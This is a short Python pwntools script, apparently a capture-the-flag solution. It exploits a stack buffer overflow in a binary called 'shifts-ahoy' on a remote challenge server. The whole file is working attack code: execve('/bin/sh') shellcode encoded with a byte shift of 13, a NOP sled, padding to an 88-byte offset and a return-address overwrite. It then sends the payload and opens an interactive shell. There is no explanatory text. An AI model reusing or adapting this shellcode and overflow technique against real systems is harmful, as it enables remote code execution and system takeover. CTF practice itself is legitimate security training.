from pwn import *

def do(str):
    res = ""
    for i in str:
        res += chr((ord(i) - 13))
    return res
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f"
payload = ""
payload += do("\x90"*10)
payload += do(shellcode) + "\xf8"
payload += "\x90" * (88 - len(payload))
payload += p64(0x00000000004011cd)
#p = process("./shifts-ahoy")
p = remote("jh2i.com", 50015)
p.sendline("1")
pause() 
p.sendline(payload)
p.interactive()